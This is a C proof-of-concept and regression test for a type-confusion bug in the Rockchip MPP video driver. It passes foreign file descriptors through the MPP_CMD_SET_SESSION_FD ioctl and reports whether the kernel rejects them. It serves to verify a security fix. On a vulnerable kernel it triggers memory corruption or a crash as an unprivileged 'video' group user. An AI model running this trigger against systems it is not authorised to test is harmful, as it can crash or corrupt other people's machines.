// SPDX-License-Identifier: GPL-2.0
/*
 * PoC — MPP_CMD_SET_SESSION_FD foreign-fd type confusion (forward-port 0059 /
 * Rockchip BSP develop-6.1 rk_vcodec).
 *
 * Before the fix, the MPP_CMD_SET_SESSION_FD handler validated the passed fd by
 * comparing the file's private_data against the value it had just read from
 * that same private_data — a tautological check that every fd passes. The
 * driver then treated the foreign file's private_data as a
 * "struct mpp_session *" (session switch), i.e. an attacker-chosen kernel
 * object is dereferenced/used as an MPP session: a controlled type confusion.
 *
 * Reachability: opening /dev/mpp_service requires only membership in the
 * "video" group, which on a Rockchip/Armbian desktop includes the logged-in
 * user and sandboxed GUI/media processes (HW decode is granted through it).
 *
 * Fixed behaviour (forward-port 0059 / this driver): the handler requires
 * fd_file(f)->f_op == &rockchip_mpp_fops before trusting private_data, so a
 * foreign fd yields the batch result -EBADF and no dereference happens.
 *
 * This PoC passes a foreign fd (eventfd, then /dev/null) and reports the batch
 * ret. On a FIXED kernel both are -EBADF (9) and the box stays up. On a
 * VULNERABLE kernel the driver dereferences the foreign private_data as an
 * mpp_session (crash / memory corruption; under KASAN a slab report).
 *
 * Unprivileged. Build: cc -O1 -Wall -o mpp-foreign-session-fd-repro \
 *                        mpp-foreign-session-fd-repro.c
 */
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/eventfd.h>
#include <linux/rk-mpp.h>

static int set_session_fd(int mpp_fd, int foreign_fd)
{
	struct mpp_bat_msg bat = { .flag = 0, .fd = (unsigned)foreign_fd,
				   .ret = 0x5a5a5a5a };
	struct mpp_request req = {
		.cmd = MPP_CMD_SET_SESSION_FD,
		.size = sizeof(bat),
		.data = &bat,
	};

	if (ioctl(mpp_fd, MPP_IOC_CFG_V1, &req) != 0)
		printf("  ioctl MPP_IOC_CFG_V1 returned nonzero (errno=%d)\n",
		       errno);
	return bat.ret;
}

int main(void)
{
	int fd = open("/dev/mpp_service", O_RDWR | O_CLOEXEC);
	if (fd < 0) { perror("open /dev/mpp_service"); return 2; }

	int efd = eventfd(0, EFD_CLOEXEC);
	int devnull = open("/dev/null", O_RDWR | O_CLOEXEC);
	int fails = 0;
	int tested = 0;

	if (efd >= 0) {
		int r = set_session_fd(fd, efd);
		printf("SET_SESSION_FD eventfd  -> ret=%d %s\n", r,
		       r == -EBADF ? "(rejected: fix present)"
				   : "(NOT -EBADF: vulnerable or crashed)");
		if (r != -EBADF) fails++;
		tested++;
		close(efd);
	}
	if (devnull >= 0) {
		int r = set_session_fd(fd, devnull);
		printf("SET_SESSION_FD /dev/null-> ret=%d %s\n", r,
		       r == -EBADF ? "(rejected: fix present)"
				   : "(NOT -EBADF: vulnerable or crashed)");
		if (r != -EBADF) fails++;
		tested++;
		close(devnull);
	}

	close(fd);
	/*
	 * If both eventfd() and open("/dev/null") failed, `fails` stayed 0 and this
	 * printed PASS having tested nothing.
	 */
	if (tested == 0) {
		printf("RESULT: FAIL (could not obtain any foreign fd - nothing was tested)\n");
		return 2;
	}
	printf(fails ? "RESULT: FAIL (kernel did not reject the foreign fd)\n"
		     : "RESULT: PASS (foreign fds rejected with -EBADF)\n");
	return fails ? 1 : 0;
}
